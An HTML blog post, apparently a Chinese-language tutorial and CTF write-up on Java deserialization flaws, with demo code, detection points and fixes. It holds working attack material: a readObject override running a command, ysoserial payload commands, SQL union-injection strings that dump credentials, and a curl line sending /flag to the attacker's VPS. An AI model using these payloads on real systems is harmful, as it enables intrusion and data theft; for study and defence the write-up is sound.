@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Zor01478">
+<meta name="keywords" content="反序列化, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="description" content="
+Web漏洞-Java反序列化
+">
+
+
+<meta property="og:description" content="
+Web漏洞-Java反序列化
+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP与Java反序列化浅析（下篇）">
+<meta name="twitter:title" content="PHP与Java反序列化浅析（下篇）">
+<meta property="og:url" content="https://Zor01478.github.io/2021/02/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87/">
+<meta property="og:site_name" content="戴头盔的招财">
+<meta property="og:description" content="
+Web漏洞-Java反序列化
+">
+<meta name="twitter:description" content="
+Web漏洞-Java反序列化
+">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2021-02-01T17:48:06">
+  
+  
+    <meta property="article:modified_time" content="2021-02-01T17:48:06">
+  
+  
+  
+    
+      <meta property="article:section" content="招财渗透屋">
+    
+  
+  
+    
+      <meta property="article:tag" content="反序列化">
+    
+      <meta property="article:tag" content="Java">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/suolue2.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/suolue2.png">
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+  <meta property="twitter:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+
+
+    <title>PHP与Java反序列化浅析（下篇）</title>
+
+    <link rel="icon" href="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+    
+
+    
+
+    <link rel="canonical" href="https://Zor01478.github.io/2021/02/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Zor01478.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Zor01478.github.io/">戴头盔的招财</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Zor01478.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Zor01478.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Zor01478</h4>
+        
+          <h5 class="sidebar-profile-bio">戴了头盔，所以头很铁</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">类别</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Zor01478" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/fengmian2.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      PHP与Java反序列化浅析（下篇）
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-02-01T17:48:06&#43;08:00">
+        
+  二月 1, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://Zor01478.github.io/categories/%e6%8b%9b%e8%b4%a2%e6%b8%97%e9%80%8f%e5%b1%8b">招财渗透屋</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+            <span class="post-header-cover-caption caption">雪国的樱花</span>
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <blockquote>
+<p>Web漏洞-Java反序列化</p>
+</blockquote>
+<h1 id="目录">目录</h1>
+<!-- raw HTML omitted -->
+<ul>
+<li><a href="#web%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96java">Web漏洞-反序列化（Java）</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B">检测</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D">修复</a></li>
+<li><a href="#%E7%9B%B8%E5%85%B3%E7%BD%91%E7%AB%99">相关网站</a></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="web漏洞-反序列化java">Web漏洞-反序列化（Java）</h2>
+<h3 id="原理">原理</h3>
+<ul>
+<li>序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。序列化后的字节流保存了Java对象的状态以及相关的描述信息。【有利于多平台通信，对象持久化存储】</li>
+<li>如果Java应用对用户输入，即<strong>不可信数据做了反序列化处理</strong>，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</li>
+<li>Java中的API实现：
+<ul>
+<li>位置：Java.io.ObjectOutputStream      Java.io.ObjectInputStream</li>
+<li>序列化：<strong>ObjectOutputStream类  &ndash;&gt;  <code>writeObject()</code></strong>  【对指定的obj对象进行序列化，把字节序列写到一个目标输出流中，一般是.ser扩展名】</li>
+<li>反序列化：<strong>ObjectInputStream类 &ndash;&gt; <code>readObject()</code></strong>【从一个输入流中读取字节序列，再把它们反序列化为一个对象，并返回】</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// 测试Demo
+</span><span style="color:#75715e">// 定义一个user类 继承 Serializable
+</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> test<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">private</span> String name<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> name<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span>String name<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+<span style="color:#f92672">}</span>   
+
+<span style="color:#75715e">// 序列化和反序列化测试
+</span><span style="color:#75715e"></span><span style="color:#f92672">package</span> test<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.FileInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.FileNotFoundException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.FileOutputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectOutputStream<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test1</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            <span style="color:#75715e">// 序列化并输出到这个文档当中
+</span><span style="color:#75715e"></span>            FileOutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;d:/test.txt&#34;</span><span style="color:#f92672">);</span>
+            ObjectOutputStream obj_out <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>out<span style="color:#f92672">);</span>
+            user u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> user<span style="color:#f92672">();</span> <span style="color:#75715e">// 创建一个对象 u
+</span><span style="color:#75715e"></span>            u<span style="color:#f92672">.</span><span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">);</span>   <span style="color:#75715e">// 给属性赋值
+</span><span style="color:#75715e"></span>            obj_out<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>u<span style="color:#f92672">);</span>  <span style="color:#75715e">// 对user类进行序列化
+</span><span style="color:#75715e"></span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;user 对象序列化成功！&#34;</span><span style="color:#f92672">);</span>
+            obj_out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+
+            <span style="color:#75715e">//利用readobject方法还原user对象
+</span><span style="color:#75715e"></span>            FileInputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;d:/test.txt&#34;</span><span style="color:#f92672">);</span>
+            ObjectInputStream ins <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>in<span style="color:#f92672">);</span>
+            user u1 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>ins<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span> <span style="color:#75715e">// 反序列化并将它赋值给一个新的对象 u1
+</span><span style="color:#75715e"></span>
+            System<span style="color:#f92672">.</span><span style="color:#a6e22e">err</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>u1<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">());</span> <span style="color:#75715e">// 查看u1的属性确实被赋值了，说明反序列化成功
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>FileNotFoundException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#75715e">// TODO Auto-generated catch block
+</span><span style="color:#75715e"></span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#75715e">// TODO Auto-generated catch block
+</span><span style="color:#75715e"></span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>ClassNotFoundException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#75715e">// TODO Auto-generated catch block
+</span><span style="color:#75715e"></span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span>
+
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><blockquote>
+<p>为了构造一个反序列化漏洞，需要重写user的readObjec方法，比如弹出计算器</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> test<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.IOException<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">private</span> String name<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">return</span> name<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setName</span><span style="color:#f92672">(</span>String name<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> in<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> ClassNotFoundException<span style="color:#f92672">,</span> IOException <span style="color:#f92672">{</span>
+        in<span style="color:#f92672">.</span><span style="color:#a6e22e">defaultReadObject</span><span style="color:#f92672">();</span>
+        Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><ul>
+<li>产生反序列化漏洞的前提是必须<code>重写继承了Serializable类的readObjec方法</code></li>
+<li>只需要修改Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;);中的calc.exe即可执行任意命令</li>
+<li>包装好的<code>恶意攻击对象</code>作为存在<code>漏洞的类的属性</code><strong>并序列化</strong>，我们就可以在反序列化的时候执行我们的恶意代码。</li>
+</ul>
+<h3 id="利用">利用</h3>
+<ul>
+<li>payload生成器：<code>ysoserial</code></li>
+<li>自定义检测工具或脚本</li>
+<li>一般序列化会结合加密（例如base64加密，所以构造的paylaod要考虑这一点）</li>
+<li>序列化参考指标
+<ul>
+<li>以 <code>ro0AB</code> 开头  大概率是Java序列化 + base64加密后的结果</li>
+<li>以 <code>aced</code> 开头  大概率是Java序列化 + hex（16进制）后的结果</li>
+</ul>
+</li>
+<li>反弹shell</li>
+<li>执行命令</li>
+</ul>
+<h3 id="检测">检测</h3>
+<ul>
+<li>黑盒
+<ul>
+<li>数据格式点
+<ul>
+<li>HTTP请求中的参数，cookies以及Parameters</li>
+<li>RMI协议【RMI是java的一种远程对象（类）调用的服务端，默认于1099端口，基予socket通信，该通信实现远程调用完全基于序列化以及反序列化】</li>
+<li>JMX 同样用于处理序列化对象</li>
+<li>自定义协议</li>
+</ul>
+</li>
+<li>特定扫描</li>
+</ul>
+</li>
+<li>白盒
+<ul>
+<li>函数点
+<ul>
+<li>ObjectInputStream.readObject</li>
+<li>ObjectInputStream.readUnshared</li>
+<li>XMLDecoder.readObject</li>
+<li>XStream.fromXML</li>
+<li>ObjectMapper.readValue</li>
+<li>JSON.parseObject</li>
+<li>&hellip;</li>
+</ul>
+</li>
+<li>组件点：参考ysoserial库</li>
+<li>代码点
+<ul>
+<li>REC执行</li>
+<li>数据认证</li>
+<li>&hellip;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="实践">实践</h3>
+<ul>
+<li>WebGoat8
+<ul>
+<li>ro0AB 开头初步判定为 Java序列化 + base64加密</li>
+<li>可以使用含有反序列化的包，groovy,hibernate-core,spring-core可能存在反序列化漏洞
+<code>java -Dhibernate5 -cp hibernate-core-5.4.9.Final -jar;ysoserial-master-300099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</code></li>
+<li>对payload.bin文件里面的内容再进行base64加密就可以生成payload</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>2020网鼎杯朱雀组-Think Java
+<ul>
+<li>下载题目附件</li>
+<li>JD-GUI(java逆向工具)干起来，查看源代码，发现里面有一个Test类和sqlDict
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java01.png" alt=""></li>
+</ul>
+<ol>
+<li>由上图得知，该题目存在一个<code>swagger-ui.html</code>接口地址:http://xx/swagger-ui.html</li>
+<li>存在路径/common/test/sqlDict</li>
+<li>存在<code>dbName可控变量</code>和一个账号密码</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p><strong>再看看sqlDict类，<code>jdbc规则</code> dbName后面加上?后面可以加任意参数，后跟参数无效也不会影响正常的数据库连接；加上sql语句的拼接，故存在注入的可能性，测试一下。</strong></p>
+</blockquote>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java02.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java03.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">#</span> <span style="color:#960050;background-color:#1e0010">先测试一下看有没有回显</span>
+dbName<span style="color:#f92672">=</span>myapp<span style="color:#f92672">?</span>a<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select database() --+
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># 爆表名
+</span><span style="color:#e6db74">dbName=myapp?a=1&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> group_concat(<span style="color:#66d9ef">table_name</span>) <span style="color:#66d9ef">from</span> information_schema.tables <span style="color:#66d9ef">where</span> table_schema<span style="color:#f92672">=</span><span style="color:#66d9ef">database</span>() <span style="color:#75715e">--+
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">#</span> <span style="color:#960050;background-color:#1e0010">爆列名</span>
+dbName<span style="color:#f92672">=</span>myapp<span style="color:#f92672">?</span>a<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span style="color:#66d9ef">user</span><span style="color:#e6db74">&#39; --+
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># 爆字段
+</span><span style="color:#e6db74">dbName=myapp?a=1&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> group_concat(name, <span style="color:#ae81ff">0</span>x3a, pwd) <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#75715e">--+
+</span></code></pre></div><p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java04.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java05.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java06.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java07.png" alt=""></p>
+<ul>
+<li>得到了一组账号密码：<code>ctfhub:ctfhub_6645_21417</code>，然而并没有什么用。</li>
+</ul>
+<blockquote>
+<p><strong>访问swagger-ui.html接口</strong></p>
+</blockquote>
+<ul>
+<li>使用刚刚获得的账号密码登录
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java09.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java08.png" alt=""></li>
+<li>查看用户信息
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java10.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E7%BD%91%E9%BC%8E%E6%9D%AFThink_Java11.png" alt=""></li>
+<li>用户登录生成的token：Bearer认证; Java序列化 + base64加密</li>
+<li>查看用户信息：进行了反序列化（可以利用）</li>
+<li>使用Burp Suite的扩展 Java-Deserialization-Scanner，选中目标后，Attack(Base64)，发现可能存在<code>ROME类型</code>的反序列化,之后可以继续在插件里exploit。【也可以直接用ysoserial生成payload】</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># java -jar ysoserial-master.jar ROME &#34;curl 自己的vps_ip -d @/flag&#34; &gt; 2233.bin</span>
+
+<span style="color:#75715e"># 再base64处理一下</span>
+<span style="color:#f92672">import</span> base64
+file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;2233.bin&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>)
+
+now <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+ba <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(now)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Bearer &#34;</span><span style="color:#f92672">+</span>ba)
+file<span style="color:#f92672">.</span>close()
+</code></pre></div><ul>
+<li>最后在服务器监听对应的端口，就能接收到flag了</li>
+</ul>
+<h3 id="修复">修复</h3>
+<ul>
+<li>
+<p>类的白名单校验机制，对所有传入的反序列化对象，在反序列化过程开始前，对类型名称做一个检查，不符合白名单的类不进行反序列化操作。很显然，这个白名单肯定是不存在Runtime的。</p>
+</li>
+<li>
+<p>禁止JVM执行外部命令<code>Runtime.exec</code>，这个措施可以通过扩展 SecurityManager 可以实现。</p>
+</li>
+</ul>
+<h3 id="相关网站">相关网站</h3>
+<ol>
+<li><a href="https://www.freebuf.com/vuls/170344.html">反序列化原理精贴</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/releases">Java反序列化漏洞利用工具ysoserial</a></li>
+<li><a href="https://github.com/WebGoat/WebGoat/releases">WebGoat靶场</a></li>
+<li><a href="https://github.com/NickstaDB/SerializationDumper/releases">NickstaDB</a></li>
+</ol>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/java/">Java</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/01/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87/" data-tooltip="PHP与Java反序列化浅析（上篇）">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Zor01478. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/01/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87/" data-tooltip="PHP与Java反序列化浅析（上篇）">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
